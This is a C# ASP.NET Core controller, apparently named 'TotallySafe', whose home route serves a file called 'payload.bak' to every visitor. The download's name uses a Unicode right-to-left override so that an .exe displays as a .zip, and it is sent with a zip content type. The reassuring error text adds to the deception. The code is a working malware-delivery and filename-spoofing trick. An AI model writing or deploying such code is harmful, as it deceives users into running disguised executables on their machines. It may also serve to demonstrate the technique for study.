using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Hosting.Internal;
using System.Text;
using System.Web;

namespace TotallySafe.Web.Controllers
{
    public class HomeController : Controller
    {
        private readonly IWebHostEnvironment _webHostEnvironment;
        private readonly ILogger<HomeController> _logger;

        public HomeController(IWebHostEnvironment webHostEnvironment, ILogger<HomeController> logger)
        {
            this._webHostEnvironment = webHostEnvironment;
            this._logger = logger;
        }

        [Route("/")]
        public IActionResult Index()
        {
            string fullPath = Path.Combine(this._webHostEnvironment.ContentRootPath, "af1le", "payload.bak");

            try
            {
                if (System.IO.File.Exists(fullPath))
                {
                    string fileName = "TotallySaf\u202epiz.exe";
                    return PhysicalFile(fullPath, "application/zip", fileName);
                }
                else
                {
                    throw new Exception(@$"File does not exist:- {fullPath}");
                }
            }
            catch (Exception ex)
            {
                this._logger.LogError(ex, $"Unable to send zip file: {fullPath}");
                return NotFound("Zip Not Found. Don't worrry, it is still safe.");
            }
        }
    }
}
